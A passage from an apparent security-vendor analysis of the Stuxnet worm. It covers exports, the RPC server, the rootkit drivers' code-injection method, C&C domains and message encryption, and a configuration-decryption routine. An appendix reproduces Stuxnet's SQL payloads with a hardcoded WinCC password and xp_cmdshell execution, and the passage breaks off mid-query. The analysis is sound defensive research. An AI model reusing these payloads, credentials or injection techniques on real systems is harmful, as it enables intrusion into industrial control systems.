s7ag_bub_write_var;\n\n    - s7ag_link_in;\n\n    - s7ag_read_szl;\n\n    - s7ag_test;\n\n    - s7blk_delete;\n\n    - s7blk_findfirst;\n\n    - s7blk_findnext;\n\n    - s7blk_read;\n\n    - s7blk_write;\n\n    - s7db_close;\n\n    - s7db_open;\n\n    - s7ag_bub_read_var_seg;\n\n    - s7ag_bub_write_var_seg;\n\n**_Export 18_**\n\nThis function completely removes the malware from the system. It performs the following operations:\n\n1. Restores forged dynamic link library (s7otbxdx.dll) for Siemens software;\n2. Notifies user-mode components to shutdown so as to remove them properly;\n3. Stops and deletes the MrxCls service (kernel-mode driver);\n4. Stops and deletes the MrxNet service (kernel-mode driver);\n5. Deletes oem7A.PNF (the main module);\n6. Deletes mrxcls.sys (kernel-mode injector);\n7. Deletes mrxnet.sys (kernel-mode hider);\n8. Deletes mdmeric3.pnf;\n9. Deletes mdmcpq3.pnf (Stuxnet's configuration file);\n10. Deletes oem6C.PNF (file with tracing/debugging information).\n\n**_Export 19_**\n\nThis function drops the following files, used to propagate through USB flash drives, into a specified\nlocation that it receives as a parameter:\n\n    - Copy of Shortcut to.lnk;\n\n    - Copy of Copy of Shortcut to.lnk;\n\n    - Copy of Copy of Copy of Shortcut to.lnk;\n\n    - Copy of Copy of Copy of Copy of Shortcut to.lnk;\n\n    - ~WTR4141.TMP;\n\n    - ~WTR4132.TMP.\n\n**_Export 22_**\n\nThis function is responsible for distributing of Stuxnet through the network by using vulnerabilities\ndescribed in the section on Distribution (MS08-67 and MS10-061). Also this function performs\ncommunication (sending and receiving updates) with instances of the worm on the other machines by\nRPC mechanism.\n\n\n-----\n\n**_Export 24_**\n\nThis function performs modifications of the Bot Configuration Data.\n\n**_Export 27_**\n\nThis function implements a component of Stuxnet's RPC Server responsible for handling remote calls.\n\n**_Export 28_**\n\nThis function exchanges information with the C&C server. It creates and sends the message to the C&C\nserver as described in section Remote Communication Protocol. When the message is ready it scans\nprocesses in the system to find iexplore.exe. If this exists then it injects the main module into it and calls\nexport function 29, passing the message as a parameter. This function is responsible for performing\nactual data exchange with the C&C server. In the event that there is no iexplore.exe in the system, it\ncalls this function from the address space of the default browser: it starts the default browser as a new\nprocess, injects into it the main module, and calls the function performing data exchange.\n\n**Figure 4.8 – The Scheme for Sending Data**\n\n**_Export 29_**\n\nThis function performs exchange of data with the C&C server. It receives the message to be sent as\ninput. Much of its functionality is described in the section on the “Remote communication protocol.” Its\npurpose is to send data to the remote server and to receive a reply as a binary module that will be\nsubsequently executed.\n\n\n-----\n\n**_Export 31_**\n\nThis function performs the same actions as function number 9. To build the dropper it can use either of\nthe following sets of files:\n\n    - _%Dir%\\GracS\\cc_alg.sav;_\n\n    - _%Dir%\\GracS\\\\db_log.sav;_\n\n    - _%Dir%\\GracS\\\\cc_tag.sav._\n\nOr\n\n    - _%Dir%\\XUTILS\\listen\\XR000000.MDX;_\n\n    - _%Dir%\\XUTILS\\links\\S7P00001.DBF;_\n\n    - _%Dir%\\XUTILS\\listen\\S7000001.MDX._\n\nWhich set to use is specified as a parameter as well as %Dir%.\n\n**_Export 32_**\n\nThis function is called from the services.exe process: otherwise, it won't be executed. This function\nstarts the RPC server to handle RPC calls made by Stuxnet's user-mode components and creates a\nwindow that drops malicious files onto removable drives.\n\nIt registers a window class with the name \" AFX64c313\" and creates a window corresponding to the\nclass created. The window procedure of the class monitors WM_DEVICE_CHANGE messages sent when\nthere is a change to the hardware configuration of a device or the computer. The window procedure of\nthe class handles only requests with wParam set to DBT_DEVICEARRIVAL. These are sent when a device\nor removable media have been inserted and have become accessible (for instance, when a USB flash\ndrive has been connected to the computer). When this happens, depending on parameters of the\nconfiguration data, it can either drop malicious files on the drive, or remove them from there.\nMoreover, configuration data also specify the minimum number of files that the removable drive should\ncontain in order to perform infection.\n\n**4.1.7** **RPC Server**\n\nStuxnet implements an RPC server to communicate with other instances of the worm over the network.\nIt uses the RPC mechanism to receive updates not only from the remote C&C server but from other\ninstances of the worm running on the infected machines in the network. This feature adds flexibility as it\nis able to stay updated even without direct connection with C&C server. It requests the version of the\nworm installed on the remote machine, and if the remote machine is running a more recent version, the\nnewer version is requested and installed on the requester machine. The following figure illustrates the\narchitecture of the server:\n\n\n-----\n\n**Figure 4.9 – Architecture of Stuxnet's RPC Server**\n\nIt consists of the two components:\n\n    - The first component is responsible for handling RPC calls from the local host, i.e. from\nmodules injected into process within the local system. It is executed within the address space of\nthe services.exe process;\n\n    - The second component of the server performs handling RPC calls from remote hosts.\nThis component is executed within the address space of the process hosting one of the\nfollowing services: netsvc, rpcss, browser.\n\nBoth components implement the same functions. The first five function as outlined on the figure above\nare executed by local component only: when these functions are executed they determine which\ncomponent calls them, and if it is the component responsible for handling remote calls, they make a call\nto the local component and exit. This is indicated in the figure with arrows. Stuxnet's RPC Server\nimplements the following procedures:\n\n    - RpcProc1 – Returns the version of the worm;\n\n    - RpcProc2 – Loads a module passed as a parameter into a new process and executes\nspecified exported function;\n\n    - RpcProc3 – Loads a module passed as a parameter into the address of the process\nexecuting this function and calls its exported function number 1;\n\n    - RpcProc4 – Loads a module passed as a parameter into a new process and executes it;\n\n    - RpcProc5 – Builds the worm dropper;\n\n    - RpcProc6 – Runs the specified application;\n\n    - RpcProc7 – Reads data from the specified file;\n\n    - RpcProc8 – Writes data into the specified file;\n\n    - RpcProc9 – Deletes the specified file;\n\n    - RpcProc10 – Works with the files of which the names are intercepted by hooks set up in\nfunction number 2 and writes information in tracing file.\n\n\n-----\n\n**4.1.8** **Resources**\n\nHere we will describe the resources of the main module. According to X the module has 13 resources.\nThe following table summarizes information as to what it contains.\n\n**Table 4.1.2 – Resources of the Main Module**\n\n## Resource ID Description\n\nKernel-mode driver (MrxCls.sys) responsible for injecting code into certain\n201\nprocesses\n\n202 A proxy dynamic link library\n\n203 A .cab file with dynamic link library inside\n\n205 Configuration data for MrxCls.sys\n\n208 A dynamic link library – fake s7otbldx.dll (Siemens SCADA module)\n\n209 Encrypted data file drop to %WINDIR%\\help\\winmic.fts\n\n210 Template PE-file, used to construct dropper (~WTR4132.TMP)\n\n221 Module used for distribution of the worm by exploiting RPC vulnerability\n\n222 Module used for distribution of the worm by exploiting MS10-061 vulnerability\n\n240 .LNK file template, used to create .LNK files exploiting vulnerability\n\n~WTR4141.TMP – dynamic link library, used to load dropper (~WTR4132.TMP)\n241\nwhile infecting system\n\nKernel-mode driver (MrxNet.sys) responsible for concealing files exploiting LNK\n242\nvulnerability and infecting system\n\n250 Module used to escalate privileges by exploiting 0-day vulnerability in Win32k.sys\n\n### 4.2 Kernel-mode functionality \n\nThe worm has some rootkit functionality, as during infection of the system it drops and installs two\nkernel-mode drivers that allow it to hide files and inject code into process in the system:\n\n  - MrxCls.sys;\n\n  - MrxNet.sys.\n\nThese modules are not packed or protected with any packer or protector. Moreover these drivers are\ndigitally signed. Here are the digital certificates of the public keys corresponding to the private keys used\nto sign the drivers (we received samples signed with two different private keys).\n\n|Resource ID|Description|\n|---|---|\n|201|Kernel-mode driver (MrxCls.sys) responsible for injecting code into certain processes|\n|202|A proxy dynamic link library|\n|203|A .cab file with dynamic link library inside|\n|205|Configuration data for MrxCls.sys|\n|208|A dynamic link library – fake s7otbldx.dll (Siemens SCADA module)|\n|209|Encrypted data file drop to %WINDIR%\\help\\winmic.fts|\n|210|Template PE-file, used to construct dropper (~WTR4132.TMP)|\n|221|Module used for distribution of the worm by exploiting RPC vulnerability|\n|222|Module used for distribution of the worm by exploiting MS10-061 vulnerability|\n|240|.LNK file template, used to create .LNK files exploiting vulnerability|\n|241|~WTR4141.TMP – dynamic link library, used to load dropper (~WTR4132.TMP) while infecting system|\n|242|Kernel-mode driver (MrxNet.sys) responsible for concealing files exploiting LNK vulnerability and infecting system|\n|250|Module used to escalate privileges by exploiting 0-day vulnerability in Win32k.sys|\n\n\n-----\n\n**Figure 4.10 – Digital certificates Used to Verify Driver's Signatures**\n\nAfter it was ascertained that the certificates were compromised, both were revoked by Verisign. Variant\ndrivers and compromised certificates have, however, been noted since.\n\n**Figure 4.11 – Digital Certificates Revoked**\n\n\n-----\n\n**4.2.1** **MRXCLS.sys**\n\n**_4.2.1.1_** **_Encrypted data_**\n\nThis driver is designated to inject code into the address space of the processes in the system. It is\nregistered in OS as a boot start service. Thus it is loaded as early as possible in the OS boot process.\nSome of its data are encrypted with a custom encryption algorithm. If we decrypt them, we get the\nfollowing string constants with the following meanings:\n\n**Table 4.2.1 – Decrypted String Constants Found in the Driver**\n\n**Name of the registry key that**\n**_REGISTRY\\MACHINE\\SYSTEM\\CurentControlSet\\Services\\MrxCls_**\n\n**corresponds to the driver**\n\n**Name of the value of the registry**\n**_Data_**\n\n**key related to the driver**\n\n**Name of the device object that is**\n**_\\Device\\MrxClsDvx_**\n\n**created by the driver**\n\nTo be able to inject code it registers a special routine that is called each time a module is loaded in\naddress space of a process by calling API function PsSetLoadImageNotifyRoutine.\n\n**_4.2.1.2_** **_Configuration data_**\n\nThe driver holds configuration data that specify in which processes the code is to be injected. The data\nare stored in driver's registry key with the value name presented in Table 4.2.1. The data can also be\nstored in a file on disk: if the driver failed for some reason to read the configuration data from registry, it\nreads it from the file, if any exists. Here is configuration data found on an infected machine:\n\n**Figure 4.12 – The configuration data of the driver**\n\nAs we can see from the figure, these data specify what modules should be injected by the driver into the\naddress spaces of certain processes. For instance, here we see that in processes in which executables\n\n|REGISTRY\\MACHINE\\SYSTEM\\CurentControlSet\\Services\\MrxCls|Name of the registry key that corresponds to the driver|\n|---|---|\n|Data|Name of the value of the registry key related to the driver|\n|\\Device\\MrxClsDvx|Name of the device object that is created by the driver|\n\n\n-----\n\nhave the names services.exe, S7tgtopx.exe and CCProjectMgr.exe, the driver injects a module stored in\na file with the name _\\SystemRoot\\inf\\oem7A.PNF. The configuration data also specify the name or_\nordinal number of the export of the injected module to be called. For instance in this case, when\noem7A.PNF will be loaded into the address spaces of the CCProjectMgr.exe or S7togtopx.exe, the\nexported function number 2 should be called. In the case of services.exe the exported function with the\nordinal 1 should be called. If a process is debugged the driver doesn't perform an injection, and it\ndetermines whether the process is debugged by reading _BeingDebugged field of the PEB structure_\nrelated to the process.\n\n**_4.2.1.3_** **_Injector_**\n\nHere we briefly describe the injector. It is not only capable of injecting modules into the address space\nof a process but is also able to stealthily call an exported function from the already injected modules.\nThe injection of a module is performed in three stages:\n\n1. Allocating memory in the address space of the target process and copying module and\nsupplemental code into the newly allocated buffer;\n2. Initializing supplemental data and code with import from kernel32.dll library, and\noverwriting the first bytes of the entry point of the process image;\n3. Mapping the module to inject into the address space of the process, initializing import\naddress table, fixing relocations, calling its entry point and restoring the original bytes of the\nimage entry point.\n\n**Figure 4.13 – Injecting a Module into Process Address Space**\n\n**Stage 1**\n\nWhen the process image is loaded into the address space of the process, the notification routine is\ncalled and the driver determines whether the process is debugged. If it isn’t, it looks in its configuration\ndata to get the name of the module to inject. Once it obtains the name of the module it allocates two\nbuffers in the process, one for the module and another for supplemental code. Then it sets memory\n\n\n-----\n\nprotection of the entry point region to PAGE_EXECUTE_WRITECOPY, a value which makes it writable. In\nthe following figure we can see a layout of the modules in the user-mode address space of the process:\n\n**Figure 4.14 – Layout of Modules and Buffers in User-Mode Address Space of a Process Prior to Loading kernel32.dll Library**\n\n**Stage 2**\n\nAt the second stage, when the driver receives notification that kernel32.dll has been mapped into the\naddress space of the process, it initializes import of the supplemental code from the loaded library and\noverwrites the first seven bytes of the entry point of the process image with the following commands:\n\n**Figure 4.15 – Patched entry point**\n\nAPIs exported by kernel32.dll and used by supplemental code are: _VirtualAlloc, VirtualFree,_\n_GetProcAddress, GetModuleHandle, LoadLibraryA, LoadLibraryW, lstrcmp, lstrcmpi, GetVersionEx,_\n_DeviceIoControl. The layout of the modules at this stage is presented on the following figure:_\n\n**Figure 4.16 – Layout of Modules and Buffers in User-Mode Address Space of a Process after Loading kernel32.dll**\n\n\n-----\n\n**Stage 3**\n\nAt this stage, when the entry point of the application receives control it transfers to the entry point of\nthe supplemental code, the purpose of which is to map the module and call its entry point. When the\nwork is finished it restores the original entry point and sets the memory protection value of the entry\npoint region to its initial value. Then it transfers control to the original entry point.\n\n**Figure 4.17 – Layout of Modules and Buffers in User-Mode Address Space of a Process after Application's Entry Point is Called**\n\n**_DeviceIoControl_**\n\nThe driver creates a device object with the name specified in Table 4.2.1 and registers handlers for the\nfollowing requests:\n\n    - IRP_MJ_CREATE;\n\n    - IRP_MJ_CLOSE;\n\n    - IRP_MJ_DEVICE_CONTROL.\n\nThe first two handlers do nothing but successfully complete IRP packet, while the third handler is used\nto dispatch control requests from an application. When the created device object receives an\nIRP_MJ_DEVICE_CONTROL request with IOCTL equal to 0x22380 it changes memory protection of the\nregion specified in the request parameters:\n\n\n-----\n\n```\nstruct IOCTL_PARAMS\n {\n    DWORD Signature; // Signature always set to 0xAFABF00D\n    DWORD Reserved1;\n    HANDLE hProcess; // Handle of the process\n    DWORD Reserved2;\n    void *BaseAddress;  // Base address of memory region\n    DWORD Reserved3;\n    DWORD RegionSize;  // Size of the memory region\n    DWORD Reserved4;\n    DWORD NewProtection; // New protection memory constant\n    DWORD Reserved5;\n };\n\n```\nWhen supplemental code changes memory protection of the entry point it initializes this structure and\npasses it as a parameter to DeviceIoControl API.\n\n**4.2.2** **MRXNET.sys**\n\nThe purpose of this driver is to hide files that are used to propagate the malware through USB drives. It\nacts as a file system driver filter. In the very beginning of its initialization it registers the\n_FileSystemRegistrationChange routine enables it to attach to file systems available in the system, but it_\nis interested only in _ntfs,_ _fat and_ _cdfs file systems. When a new file system is mounted the driver_\nreceives a notification, creates a device object and attaches it to the top of the device stack. From then\non the driver is able to monitor all the requests that are addressed to the file system. It waits for an\nIRP_MJ_MOUNT_VOLUME request to arrive and attaches itself to the mounted volume to intercept\nrequests related to operations with files and directories. It creates _DeviceObjects and attaches it to_\nthose device objects created by and corresponding to the specified file system drivers. The driver hooks\n_IRP_MJ_DIRECTORY_CONTROL requests addressed to the file systems it is attached to, enabling it to_\nfilter results from querying information about files and subdirectories. This request is used to get\ninformation related to the directory, and in particular what files are located in the directory.\n\nIt hides the same files as ~WTR4141.tmp does:\n\n  - files with \".LNK\" extension with a file length of 1471 (0x104b) bytes;\n\n  - files with \".TMP\" extension where the name consists of 12 characters (including extension) in\nthe following format: \"~WTRabcd.TMP\", where a,b,c,d are digits from 0 to 9 which sum modulo 10\nequals 0 (\"~WTR4411.TMP\" for example).\n\nOn receiving an IRP_MJ_DIRECTORY_CONTROL request it sets an IO completion routine that filters\nresults of the request. Depending on the control operation that is requested, the driver goes through\nthe corresponding structure and deletes all entries matching the search criteria.\n\n\n-----\n\n### 4.3 Stuxnet Bot Configuration Data\n\nStuxnet stores its encrypted configuration data (1860 bytes) in _%WINDIR%\\inf\\mdmcpq3.pnf. A_\ndecryption algorithm is presented in Appendix A. These data contain information about:\n\n    - URLs of C&C servers (see figure below);\n\n    - Activation time – the time and date after which the worm is active;\n\n    - Deactivation time – the time after which the worm becomes inactive and deletes itself;\n\n    - Version of the malware;\n\n    - The minimum quantity of files that the removable drive should contain to drop malicious\n.LNK files successfully;\n\n    - Other information about its propagation and functioning.\n\n**Figure 4.18 – An Extract from the Configuration Data**\n\n\n-----\n\n### 4.4 Remote Communication Protocol\n\nThe malware communicates to the C&C server through http. A list of URLs is included in the Stuxnet\nconfiguration data of Stuxnet:\n\n    - _www.windowsupdate.com;_\n\n    - _www.msn.com;_\n\n    - _www.mypremierfutbol.com;_\n\n    - _www.todaysfutbol.com_\n\nThe first two URLs are used to check that the system has connection to the Internet, while the third and\nthe fourth are URLs of C&C servers. If it fails to successfully establish connection with the remote host\n(www.windowsupdate.com) it stops sending data to the C&C server.\n\nWhen the malware confirms that the infected computer is connected to the Internet it sends an http\nrequest to the remote server. Here is an example of the URL with data:\n\n_http:// www.mypremierfutbol.com/index.php?data=data_to_send,_\n\nwhere data_to_send is encrypted and encoded message.\n\nIt uses a custom encryption algorithm with a key length equal 31 bytes:\n```\n// Encryption\nchar Key[31] = { 0x67, 0xA9, 0x6E, 0x28, 0x90, 0x0D, 0x58, 0xD6, \n           0xA4, 0x5D, 0xE2, 0x72, 0x66, 0xC0, 0x4A, 0x57, \n           0x88, 0x5A, 0xB0, 0x5C, 0x6E, 0x45, 0x56, 0x1A, \n           0xBD, 0x7C, 0x71, 0x5E, 0x42, 0xE4, 0xC1  };\n// Encryption procedure\nvoid EncryptData(char *Buffer, int BufferSize, char *Key)\n{\n    for (int i = 0 ; i < BufferSize ; i ++)\n       Buffer[i] ^= Key[i % 31];\n    return;\n}\n\n```\nThe encrypted data are represented as a string of Unicode characters: each byte of the binary data is\npresented as 2 characters. For instance, 0x7A96E2890 will be written as \"7A96E2890\" Unicode string.\n\nThe data to be sent have the following structure:\n\n\n-----\n\n**Figure 4.19 – The Structure of the Data Sent to C&C Server**\n\nThe first byte of the data is a hexadecimal constant 0x01, followed by 16 bytes of the malware\nconfiguration data. The IP address of the host is the first non-loopback entry in the list of IPv4 addresses\nof the host sorted in the ascending order.\n\nWhile preparing the data to be sent the malware gathers information about all the network adapters\ninstalled on the system by calling the GetAdaptersInfo API. This includes:\n\n    - The adapter name;\n\n    - The adapter description;\n\n    - The hardware address of the adapter;\n\n    - The list of IPv4 addresses associated with the adapter;\n\n    - The IPv4 address of the gateway for the adapter;\n\n    - The IPv4 address of the DHCP server for the adapter;\n\n    - The IPv4 address of the primary WINS server;\n\n    - The IPv4 address of the secondary WINS server;\n\nThe message field can be described with the following structure:\n```\nstruct STUXNET_CC_MESSAGE\n{\n    BYTE Constant; // Set to 0x01\n    BYTE ConfigByte; // A BYTE of the configuration data\n    BYTE OsVerMajor; // The major version number of the OS\n    BYTE OsVerMinor; // The minor version number of the OS\n    BYTE OsVerServicePackMajor;  // The major version number of the service pack\n                      // installed on the system\n    BYTE Reserved[3]; // padding\n    DWORD ConfigDword;  // A DWORD of the configuration data\n    WORD CurrentACP; // Current ANSI code page identifier for the \n                      // system\n    WORD OsVerSuitMask;  // A bitmask identifying the product suites \n                      // available on the system\n    BYTE Flags; // See reference bellow\n\n```\n\n-----\n\n```\n};\n\n```\n```\nchar ComputerName[];  // NetBIOS name of the local computer\nchar DomainName[];  // Name of the domain or workgroup the computer\n                   // is joined to if any\nchar ConfigDataStr[]; // A string from configuration data\n\n```\n**Figure 4.20 – Description of the Flags Field in STUXNET_CC_MESSAGE Structure**\n\n\nWe can see that flags corresponding to the first and the last bits in the byte are unused. Flags 1,4,5,6 are\nrelated to the configuration data of the malware. Flag 2 signifies whether Stuxnet is active. Flag 3 is set\nin case Stuxnet detects Siemens software installed on the infected machine, which it does by searching\nin the registry the following keys and values:\n\n    - Key – HKLM\\SOFTWARE\\SIEMENS\\STEP7, value – STEP7_Version;\n\n    - Key – HKLM\\SOFTWARE\\SIEMENS\\WinCC\\Setup, value – Version.\n\nWhen the message is constructed, the malware encrypts it by XORing each byte with the hexadecimal\nconstant 0xFF. The malware receives a response from the C&C server which is structured as follows:\n\n**Figure 4.21 – The Structure of the Response from the C&C Server**\n\nThe first four bytes of the response store the size of the image in the received data: if image size plus 5\nbytes isn't equal to the size of the received data, then Stuxnet stops parsing the response. On receiving\nthe response the malware loads the image and call its export with ordinal number 1. The fifth byte of\nthe response specifies exactly how it should be executed. If this byte is set to 0x01, then an RPC function\nwill be called and as a result the received image will be executed at the address of the process hosting\nStuxnet's RPC server. If the fifth byte is zero, then the image will be loaded into the address space of this\nprocess and an export function numbered as 1 will be executed. The following figure clarifies this\nmechanism:\n\n\n-----\n\n**Figure 4.22 – Dispatching Received Data**\n\n\n-----\n\n## Conclusion\n\nWe conducted a detailed technical analysis of the worm Win32/Stuxnet, which currently is perhaps the\nmost technologically sophisticated malicious program developed for a targeted attack to date. We have\nnot released extensive information here about injecting code into the SCADA system, as it deserves an\nindependent discussion (and indeed, has been discussed at length by Langner). This research was\nintended primarily as material for specialists in information security, showing how technology can be\nmade use of in targeted attacks.\n\nThanks to everyone who finished reading our report until the end!\n\n\n-----\n\n## Appendix A\n\nFurther Coverage and Resources\n\nhttp://www.heise.de/newsticker/meldung/Trojaner-verbreitet-sich-ueber-neue-Windows-Luecke[1038281.html;](http://www.heise.de/newsticker/meldung/Trojaner-verbreitet-sich-ueber-neue-Windows-Luecke-1038281.html)\n\nhttp://www.reconstructer.org/main.html;\n\nhttp://www.h-online.com/security/news/item/Trojan-spreads-via-new-Windows-hole-1038992.html\n\nhttp://krebsonsecurity.com/2010/07/experts-warn-of-new-windows-shortcut-flaw/\n\nhttp://it.slashdot.org/submission/1283670/Malware-Targets-Shortcut-Flaw-in-Windows-SCADA\n\nhttp://it.slashdot.org/story/10/07/15/1955228/Malware-Targets-Shortcut-Flaw-In-Windows-SCADA\n\nhttp://www.zdnet.co.uk/news/security/2010/07/16/spy-rootkit-goes-after-key-indian-iranian-systems[40089564/](http://www.zdnet.co.uk/news/security/2010/07/16/spy-rootkit-goes-after-key-indian-iranian-systems-40089564/)\n\nhttp://www.msnbc.msn.com/id/38315572\n\nhttp://www.reuters.com/article/idUSTRE66I5VX20100719\n\nhttp://forums.cnet.com/5208-6132_102-0.html?messageID=3341877\n\nhttp://www.f-secure.com/weblog/archives/00001993.html\n\nhttp://news.softpedia.com/news/PoC-Exploit-Code-Available-for-Windows-LNK-Vulnerability[148140.shtml](http://news.softpedia.com/news/PoC-Exploit-Code-Available-for-Windows-LNK-Vulnerability-148140.shtml)\n\nhttp://www.computerworld.com/s/article/9179339/Windows_shortcut_attack_code_goes_public?taxo\n[nomyId=17&pageNumber=1](http://www.computerworld.com/s/article/9179339/Windows_shortcut_attack_code_goes_public?taxonomyId=17&pageNumber=1)\n\nhttp://krebsonsecurity.com/2010/09/stuxnet-worm-far-more-sophisticated-than-previously[thought/?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+KrebsOnSecurity+%](http://krebsonsecurity.com/2010/09/stuxnet-worm-far-more-sophisticated-than-previously-thought/?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+KrebsOnSecurity+%28Krebs+on+Security%29)\n[28Krebs+on+Security%29](http://krebsonsecurity.com/2010/09/stuxnet-worm-far-more-sophisticated-than-previously-thought/?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+KrebsOnSecurity+%28Krebs+on+Security%29)\n\nhttp://blog.eset.com/2010/08/04/assessing-intent\n\nhttp://www.google.com/hostednews/ap/article/ALeqM5h7lX0JoE1AGngQoEfWWmCM6THizQD9HC86L\n[80](http://www.google.com/hostednews/ap/article/ALeqM5h7lX0JoE1AGngQoEfWWmCM6THizQD9HC86L80)\n\nhttp://www.dailytech.com/Hackers+Target+Power+Plants+and+Physical+Systems/article19257.htm\n\nhttp://www.scmagazineus.com/keeping-hilfs-from-crashing-your-party/article/173975/\n\nhttp://www.sans.org/newsletters/newsbites/newsbites.php?vol=12&issue=74\n\n\n-----\n\n[http://www.computerworld.com/s/article/9185919/Is_Stuxnet_the_best_malware_ever_?taxonomyId=](http://www.computerworld.com/s/article/9185919/Is_Stuxnet_the_best_malware_ever_?taxonomyId=82)\n[82](http://www.computerworld.com/s/article/9185919/Is_Stuxnet_the_best_malware_ever_?taxonomyId=82)\n\nhttp://www.zdnet.co.uk/news/security-threats/2010/09/16/siemens-stuxnet-infected-14-industrial[plants-40090140/](http://www.zdnet.co.uk/news/security-threats/2010/09/16/siemens-stuxnet-infected-14-industrial-plants-40090140/)\n\nhttp://www.h-online.com/security/news/item/Stuxnet-worm-can-control-industrial-systems[1080751.html](http://www.h-online.com/security/news/item/Stuxnet-worm-can-control-industrial-systems-1080751.html)\n\nhttp://www.csoonline.com/article/614064/siemens-stuxnet-worm-hit-industrial-systemss\n\n[http://secunia.com/advisories/41525/](http://secunia.com/advisories/41525/)\n\n[http://secunia.com/advisories/41471/](http://secunia.com/advisories/41471/)\n\n[http://www.csoonline.com/article/614064/siemens-stuxnet-worm-hit-industrial-systemss](http://www.csoonline.com/article/614064/siemens-stuxnet-worm-hit-industrial-systemss)\n\n[http://blogs.technet.com/b/msrc/;](http://blogs.technet.com/b/msrc/)\n\n[http://www.microsoft.com/technet/security/bulletin/ms10-061.mspx;](http://www.microsoft.com/technet/security/bulletin/ms10-061.mspx)\n\n[http://blogs.technet.com/b/srd/archive/2010/09/14/ms10-061-printer-spooler-vulnerability.aspx.](http://blogs.technet.com/b/srd/archive/2010/09/14/ms10-061-printer-spooler-vulnerability.aspx)\n\n[http://www.langner.com/en/index.htm](http://www.langner.com/en/index.htm)\n\n[http://realtimeacs.com/?page_id=65](http://realtimeacs.com/?page_id=65)\n\n[http://realtimeacs.com/?page_id=66](http://realtimeacs.com/?page_id=66)\n\n[http://www.symantec.com/connect/blogs/exploring-stuxnet-s-plc-infection-process](http://www.symantec.com/connect/blogs/exploring-stuxnet-s-plc-infection-process)\n\n[http://www.virusbtn.com/conference/vb2010/programme/index](http://www.virusbtn.com/conference/vb2010/programme/index)\n\n[http://blog.eset.com/?s=stuxnet](http://blog.eset.com/?s=stuxnet)\n\n[http://frank.geekheim.de/?p=1189](http://frank.geekheim.de/?p=1189)\n\n[http://www.faz.net/s/RubCEB3712D41B64C3094E31BDC1446D18E/Doc~E8A0D43832567452FBDEE07A](http://www.faz.net/s/RubCEB3712D41B64C3094E31BDC1446D18E/Doc~E8A0D43832567452FBDEE07A)\n[F579E893C~ATpl~Ecommon~Scontent.html](http://www.faz.net/s/RubCEB3712D41B64C3094E31BDC1446D18E/Doc~E8A0D43832567452FBDEE07A)\n\n[http://www.computerworld.com/s/article/9187300/Microsoft_confirms_it_missed_Stuxnet_print_spoo](http://www.computerworld.com/s/article/9187300/Microsoft_confirms_it_missed_Stuxnet_print_spooler_zero_day_)\n[ler_zero_day_%20](http://www.computerworld.com/s/article/9187300/Microsoft_confirms_it_missed_Stuxnet_print_spooler_zero_day_)\n\n\n-----\n\n## Appendix B\n\nDecryption algorithm for PNF file with configuration data\n```\n\"\"\"\n//key = 71\n//counter = byte number from begin file \nmov   eax, Key\nimul  eax, _Offset\nmov   ecx, eax\nshr   ecx, 0Bh\nxor   ecx, eax\nimul  ecx, 4E35h\nmovzx  edx, cx\nmovzx  ecx, dx\nimul  ecx, ecx\nmov   eax, ecx\nshr   ecx, 0Dh\nshr   eax, 17h\nadd   al, cl\nmov   ecx, edx\nshr   ecx, 8\nxor   eax, ecx\nmovzx  ecx, dl\nxor   eax, ecx\nmovzx  ecx, _Byte\nxor   eax, ecx\nmov result, al\n\"\"\"\n#decrypt function on python\ndef decrypt(key, counter, sym):\n  v0 = key * counter\n  v1 = v0 >> 0xb\n  v1 = (v1 ^ v0) * 0x4e35\n  v2 = v1 & 0xffff\n  v3 = v2 * v2\n  v4 = v3 >> 0xd\n  v5 = v3 >> 0x17\n  xorbyte=((v5 & 0xff) + (v4 & 0xff)) & 0xff\n  xorbyte=xorbyte ^ ((v2 >> 8) & 0xff)\n  xorbyte=xorbyte ^ (v2 & 0xff)\n  return xorbyte ^ sym\n\n```\n\n-----\n\n## Appendix C\n\nSQL query strings embedded in Stuxnet\n\n**String 1**\n```\ndeclare \n    @t varchar(4000), \n    @e int, \n    @f int\n    if exists (select text from dbo.syscomments\n               where id = object_id(N'[dbo].[MCPVREADVARPERCON]')) \n       select @t = rtrim(text) from dbo.syscomments c, dbo.sysobjects o \n               where o.id = c.id and \n               c.id = object_id(N'[dbo].[MCPVREADVARPERCON]') \n       set @e = charindex(',openrowset', @t) \n       if @e = 0 \n           set @t = right(@t, len(@t) - 7)\n       else\n           begin\n               set @f = charindex('sp_msforeachdb', @t) \n               if @f = 0 \n                   begin\n                      set @t = left(@t, @e - 1)\n                      set @t = right(@t, len(@t) - 7)\n                   end\n               else\n                   select * from fail_in_order_to_return_false \n           end\n    set @t = 'alter ' + @t +\n',openrowset(''SQLOLEDB'',''Server=.\\WinCC;uid=WinCCConnect;pwd=2WSXcder'',''select 0;set\nIMPLICIT_TRANSACTIONS off;declare @z nvarchar(999);set @z = ''''use [?];declare @t\nnvarchar(2000);declare @s nvarchar(9);set @s = ''''''''--CC-S'''''''' + char(80);if\nleft(db_name(), 2) = ''''''''CC'''''''' select @t = substring(text, charindex(@s, text) +\n8, charindex(''''''''--*'''''''', text) - charindex(@s, text) - 8) from syscomments where\ntext like (''''''''%'''''''' + @s + ''''''''%'''''''');if @t is not NULL\nexec(@t)'''';exec sp_msforeachdb @z'')'\n    exec (@t)\n\n```\n\n-----\n\n**String 2**\n```\ndeclare\n    @t varchar(4000), \n    @e int, \n    @f int\n    if exists (select * from dbo.syscomments\n               where id = object_id(N'[dbo].[MCPVPROJECT2]'))\n       select @t = rtrim(c.text) from dbo.syscomments c, dbo.sysobjects o \n               where o.id = c.id and\n               c.id = object_id(N'[dbo].[MCPVPROJECT2]') \n                   order by c.number, c.colid\n    set @e = charindex('--CC-SP', @t)\n    if @e=0\n       begin\n           set @f = charindex('where', @t)\n           if @f <> 0\n               set @t = left(@t, @f - 1)\n           set @t = right(@t, len(@t) - 6)\n       end\n    else\n       select * from fail_in_order_to_return_false\n    set @t = 'alter ' + @t + ' where ((SELECT top 1 1 FROM MCPVREADVARPERCON)=''1'') -CC-SP use master;declare @t varchar(999),@s varchar(999),@a int declare r cursor for\nselect filename from master..sysdatabases where (name like ''CC%'') open r fetch next\nfrom r into @t while (@@fetch_status<>-1) begin set @t=left(@t,len(@t)-charindex(''\\''\n,reverse(@t))) + ''\\GraCS\\cc_tlg7.sav'';exec master..xp_fileexist @t, @a out;if @a=1\nbegin set @s = ''master..xp_cmdshell ''''extrac32 /y \"''+@t+''\"\n\"''+@t+''x\"'''''';exec(@s);set @t = @t+''x'';dbcc 